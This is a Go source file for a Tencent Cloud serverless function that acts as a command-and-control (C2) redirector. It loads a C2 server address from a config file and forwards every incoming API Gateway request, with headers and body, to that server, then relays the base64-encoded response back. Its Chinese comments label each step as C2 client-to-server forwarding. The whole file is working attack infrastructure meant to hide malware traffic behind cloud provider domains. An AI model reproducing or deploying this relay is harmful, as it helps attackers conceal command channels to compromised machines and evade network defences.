package main

import (
	"context"
	"encoding/base64"
	"fmt"
	"gopkg.in/yaml.v2"
	"io/ioutil"
	"net/http"
	"strings"
	"time"

	"github.com/tencentyun/scf-go-lib/cloudfunction"
	"github.com/tencentyun/scf-go-lib/events"
)

type config struct {
	ProjectName string   `yaml:"ProjectName"`
	C2Srv       c2SrvCfg `yaml:"C2Srv"`
}

type c2SrvCfg struct {
	Address string `yaml:"Address"`
}

var settings config

func c2Forward(ctx context.Context, event events.APIGatewayRequest) (resp events.APIGatewayResponse, err error) {

	//整体API响应
	resp = events.APIGatewayResponse{
		IsBase64Encoded: true,
		Headers:         map[string]string{},
	}
	//1、构造c2客户端请求
	body := strings.NewReader(event.Body)
	req, err := http.NewRequest(event.Method, settings.C2Srv.Address+event.Path, body)
	if err != nil {
		fmt.Printf("make request err: %v", err)
		return resp, err
	}
	for k, v := range event.Headers {
		req.Header.Add(k, v)
	}
	//2、转发c2客户端至服务端
	client := &http.Client{Timeout: time.Duration(10 * time.Second)}
	c2resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("request err: %v", err)
		return resp, err
	}
	//3、响应c2客户端
	defer c2resp.Body.Close()
	respBody, _ := ioutil.ReadAll(c2resp.Body)
	decodeBytes := base64.StdEncoding.EncodeToString(respBody)
	resp.Body = decodeBytes
	resp.StatusCode = c2resp.StatusCode
	for k, v := range c2resp.Header {
		resp.Headers[k] = strings.Join(v, "")
	}
	return resp, nil
}

func main() {

	content, err := ioutil.ReadFile("./config.yaml")
	if err != nil {
		panic(err)
	}
	err = yaml.Unmarshal(content, &settings)
	if err != nil {
		panic(err)
	}
	// Make the handler available for Remote Procedure Call by Cloud Function
	cloudfunction.Start(c2Forward)
}
